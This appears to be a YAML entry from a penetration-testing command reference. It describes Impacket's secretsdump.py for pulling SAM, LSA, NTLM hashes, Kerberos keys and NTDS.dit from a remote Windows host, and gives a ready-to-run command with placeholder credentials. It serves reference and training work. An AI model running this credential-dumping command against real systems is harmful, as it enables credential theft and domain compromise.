---
description: |
  Impacket's secretsdump.py will perform various techniques to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Password: password123

command: |
  python3 secretsdump.py test.local/john:password123@10.10.10.1
items:
  - Password
  - Username
services:
  - Kerberos
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
  - https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy
---
